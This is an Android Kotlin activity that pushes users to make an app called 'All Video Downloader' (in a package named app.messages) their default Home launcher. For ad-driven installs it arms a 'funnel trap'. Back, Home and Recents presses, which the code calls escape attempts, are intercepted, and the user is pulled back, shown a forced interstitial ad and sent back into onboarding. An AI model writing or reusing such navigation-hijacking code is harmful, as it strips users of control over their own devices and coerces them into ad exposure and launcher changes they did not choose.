package app.messages.ui.activity

import android.app.role.RoleManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.graphics.Color
import android.widget.FrameLayout
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import app.messages.databinding.ActivitySetDefaultLauncherBinding
import app.messages.ui.base.PaidFunnelActivity
import app.messages.ui.launcher.LauncherActivity

class SetDefaultLauncherActivity : PaidFunnelActivity() {

    private lateinit var binding: ActivitySetDefaultLauncherBinding

    override fun shouldApplySystemBarInsets(): Boolean = false

    private fun isDefaultLauncherApp(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            return roleManager?.isRoleHeld(RoleManager.ROLE_HOME) == true
        } else {
            val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
            val resolveInfo = packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
            return resolveInfo?.activityInfo?.packageName == packageName
        }
    }

    private val launcherRoleLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        // The system picker returned → let the guard enforce normally again.
        pickerOpen = false
        learning.screenguard.ScreenGuardDemo.setSystemPickerOpen(false)
        val isDefault = isDefaultLauncherApp()
        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] launcherRoleLauncher result received. isDefaultLauncherApp=$isDefault")
        if (isDefault) {
            goToNext()
        } else {
            android.widget.Toast.makeText(this, getString(app.messages.R.string.please_set_as_default_sms_app_to_proceed).replace("SMS", "Home"), android.widget.Toast.LENGTH_SHORT).show()
        }
    }

    /** True while WE launched the system ROLE_HOME / home-settings picker (so leaving to it isn't "the user escaping"). */
    private var pickerOpen = false

    private val isNavigatingToNext = java.util.concurrent.atomic.AtomicBoolean(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes = window.attributes.apply {
                layoutInDisplayCutoutMode = android.view.WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
        super.onCreate(savedInstanceState)
        setupEdgeToEdge()
        binding = ActivitySetDefaultLauncherBinding.inflate(layoutInflater)
        setContentView(binding.root)
        applyBottomInsets()

        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] onCreate() entered. isDefaultLauncherApp=${isDefaultLauncherApp()}")

        if (isDefaultLauncherApp()) {
            android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] App is already default launcher -> calling goToNext()")
            goToNext()
            return
        }

        // FUNNEL-GUARD (learning): arm the trap on THIS screen for paid (non-organic) installs still in
        // onboarding. Registering here (not just after granting) lets the guard watch the set-default
        // screen, so Home/Recents leaves are pulled back and routed to Language — same as the reference
        // app's FunnelScreenActivity. Organic installs never reach here (Splash routes them away), and
        // shouldShow() == isAdInstall && !onboardingDone gates it regardless.
        if (app.messages.ui.paidonboarding.PaidOnboardingPrefs.shouldShow(this)) {
            android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] Paid install in onboarding -> arming funnel guard on set-default screen")
            app.messages.onboarding.watch.OnboardingAppWatcher.register(this)
            learning.screenguard.ScreenGuardDemo.register(this)
        }

        // Back on the set-default screen (trapped): don't exit — force-advance into the funnel with the
        // interstitial, exactly like the reference (onIntroBack → onSystemButton reorders → onNewIntent →
        // validateDefaultRoleAndAdvance(force) → showInterstitialAfterDefault → Language).
        onBackPressedDispatcher.addCallback(this) {
            if (isFunnelTrapActive()) {
                android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] ⛔ Back (trap armed) -> force-advance to Language")
                forceAdvanceToLanguage("back")
            } else {
                isEnabled = false
                onBackPressedDispatcher.onBackPressed()
            }
        }

        val titleHtml = "<font color='#1E1E1E'><b>Set </b></font><font color='#FF5733'><b>All Video Downloader</b></font><br/><font color='#1E1E1E'><b>as Default Home App</b></font>"
        binding.tvTitle.text = androidx.core.text.HtmlCompat.fromHtml(titleHtml, androidx.core.text.HtmlCompat.FROM_HTML_MODE_LEGACY)

        binding.btnSetDefault.setOnClickListener {
            android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] User clicked 'Set as Default' button -> preloading SetAsDefault Interstitial in background")
            app.messages.config.AdsConfigManager.preloadSetAsDefaultInterstitial(this)
            requestDefaultLauncherRole()
        }
    }

    private fun setupEdgeToEdge() {
        WindowCompat.setDecorFitsSystemWindows(window, false)
        window.statusBarColor = Color.TRANSPARENT
        window.navigationBarColor = Color.TRANSPARENT

        val controller = WindowInsetsControllerCompat(window, window.decorView)
        // Light background -> Crisp dark status bar & navigation bar icons
        controller.isAppearanceLightStatusBars = true
        controller.isAppearanceLightNavigationBars = true

        // Clear BaseActivity's white background and top padding on android.R.id.content
        val root: FrameLayout = findViewById(android.R.id.content)
        root.setBackgroundColor(Color.TRANSPARENT)
        ViewCompat.setOnApplyWindowInsetsListener(root, null)
        root.setPadding(0, 0, 0, 0)
    }

    private fun applyBottomInsets() {
        ViewCompat.setOnApplyWindowInsetsListener(binding.root) { _, insets ->
            val navBars = insets.getInsets(WindowInsetsCompat.Type.navigationBars())
            val baseMargin = (16 * resources.displayMetrics.density).toInt()
            (binding.llBottomContainer.layoutParams as? ConstraintLayout.LayoutParams)?.let { lp ->
                lp.bottomMargin = baseMargin + navBars.bottom
                binding.llBottomContainer.layoutParams = lp
            }
            insets
        }
    }

    override fun onResume() {
        super.onResume()
        val isDefault = isDefaultLauncherApp()
        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] onResume() -> isDefaultLauncherApp=$isDefault")
        if (isDefault) {
            goToNext()
        }
    }

    private fun requestDefaultLauncherRole() {
        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] requestDefaultLauncherRole() called")
        if (!isDefaultLauncherApp()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val roleManager = getSystemService(RoleManager::class.java)
                if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_HOME)) {
                    if (!roleManager.isRoleHeld(RoleManager.ROLE_HOME)) {
                        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] Launching RoleManager intent for ROLE_HOME")
                        val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_HOME)
                        notePickerOpening()
                        launcherRoleLauncher.launch(intent)
                    } else {
                        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] Role is already held -> calling goToNext()")
                        goToNext()
                    }
                } else {
                    android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] RoleManager unavailable -> launching legacy request")
                    launchLegacyDefaultLauncherRequest()
                }
            } else {
                android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] Pre-Q device -> launching legacy request")
                launchLegacyDefaultLauncherRequest()
            }
        } else {
            android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] Already default launcher -> calling goToNext()")
            goToNext()
        }
    }

    private fun launchLegacyDefaultLauncherRequest() {
        val intent = Intent(Settings.ACTION_HOME_SETTINGS)
        notePickerOpening()
        launcherRoleLauncher.launch(intent)
    }

    /** Mark that WE are opening the system picker, so the guard stands down (doesn't yank over it). */
    private fun notePickerOpening() {
        pickerOpen = true
        learning.screenguard.ScreenGuardDemo.setSystemPickerOpen(true)
    }

    /**
     * Set-default adds extra gates on top of the shared funnel trap (PaidFunnelActivity):
     * never while OUR system role picker is up, while we're navigating onward, or once already
     * default. Home → Language and Recents → pull-back are handled by the base + ScreenGuardDemo.
     */
    override fun isFunnelTrapActive(): Boolean =
        !pickerOpen &&
            !isNavigatingToNext.get() &&
            !isDefaultLauncherApp() &&
            super.isFunnelTrapActive()

    /** Fired once, so repeated guard re-entries / escape attempts don't stack navigations. */
    private val hasAdvancedToLanguage = java.util.concurrent.atomic.AtomicBoolean(false)

    /**
     * IDENTICAL TO REFERENCE (SetDefaultActivity.onNewIntent → validateDefaultRoleAndAdvance(force) →
     * showInterstitialAfterDefault): when the guard's REORDER_TO_FRONT pull-back re-delivers the intent
     * to this screen (the user pressed Home/Recents to escape), force-advance into the funnel — show the
     * Set-As-Default interstitial, then open Language (Flow A from page 1) and finish this screen.
     */
    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] onNewIntent (guard re-entry) -> maybe force-advance")
        if (isFunnelTrapActive()) {
            forceAdvanceToLanguage("onNewIntent")
        }
    }

    /** Interstitial (if any) then Language + Flow-A-from-page-1, finishing this screen. Runs once. */
    private fun forceAdvanceToLanguage(reason: String) {
        if (!isFunnelTrapActive()) return
        if (!hasAdvancedToLanguage.compareAndSet(false, true)) return
        isNavigatingToNext.set(true)   // disarm the trap while we navigate
        // Stand the guard down while the interstitial + navigation run, so it doesn't pull back over
        // the ad (reference showInterstitialAfterDefault → FunnelGuard.noteInAppAdvance(3000)).
        learning.screenguard.ScreenGuardDemo.noteOwnNavigation(3000L)
        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] 🚧 escape ($reason) -> SetAsDefault interstitial -> Language (reference force-advance)")
        app.messages.config.AdsConfigManager.preloadSetAsDefaultInterstitial(this)
        app.messages.config.AdsConfigManager.showSetAsDefaultInterstitial(this) {
            startActivity(
                app.messages.ui.paidonboarding.PaidOnboardingActivity.restartFromLanguage(this).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                }
            )
            overridePendingTransition(0, 0)
            finish()
        }
    }

    private fun goToNext() {
        if (!isNavigatingToNext.compareAndSet(false, true)) {
            android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] goToNext() ignored (already navigating)")
            return
        }

        // Log one-time Firebase Analytics event for setting default launcher
        app.messages.analytics.AnalyticsHelper.logOnce(
            context = this,
            prefKey = app.messages.preferences.PreferenceHelper.KEY_EVENT_SET_LAUNCHER_LOGGED,
            eventName = app.messages.analytics.EventNames.LAUNCHER_PERMISSION_GRANTED
        )

        android.util.Log.d("SetDefaultFlow", "[SetDefaultLauncherActivity] goToNext() -> Preloading language native ad and transitioning to LauncherActivity")
        app.messages.config.AdsConfigManager.preloadLanguageNativeAd(this)

        // Default launcher granted: start the onboarding watcher for paid installs still in Flow A.
        if (app.messages.ui.paidonboarding.PaidOnboardingPrefs.shouldShow(this)) {
            app.messages.onboarding.watch.OnboardingAppWatcher.register(this)
        }

        val prefs = app.messages.preferences.PreferenceHelper.getInstance(this)
        val intent = if (!prefs.isLanguageSelected()) {
            Intent(this, LanguageSelectionActivity::class.java)
        } else if (app.messages.ui.paidonboarding.PaidOnboardingPrefs.shouldShow(this)) {
            app.messages.ui.paidonboarding.PaidOnboardingActivity.restartFromLanguage(this)
        } else {
            Intent(this, LauncherActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                putExtra("open_chats_first", true)
            }
        }
        startActivity(intent)
        finish()
    }
}

